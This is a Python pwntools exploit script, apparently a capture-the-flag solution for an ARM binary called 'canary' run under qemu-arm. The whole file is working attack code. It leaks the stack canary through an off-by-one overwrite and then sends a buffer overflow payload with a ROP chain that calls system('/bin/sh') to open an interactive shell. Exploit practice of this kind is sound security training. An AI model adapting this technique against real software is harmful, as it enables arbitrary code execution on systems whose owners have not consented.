from pwn import *

target = process(['qemu-arm', 'canary'])

system = p32(0x16d90)
binsh = p32(0x71eb0)
gadget = p32(0x26b7c) # pop {r0, r4, pc}

def clearInput():
    print(target.recvuntil('>'))

def leakCanary():
    target.send(b"0" * 41)
    print(target.recvuntil('0' * 41))
    leak = target.recv(3)
    canary = u32(b"\x00" + leak)
    print("Stack canary: " + hex(canary))
    return canary

clearInput()
canary = leakCanary()

# payload = ""
payload = b"0" * 40
payload += p32(canary)
payload += b"1" * 12
payload += gadget
payload += binsh
payload += b"2" * 4
payload += system

target.sendline(payload)
target.sendline("")

target.interactive()
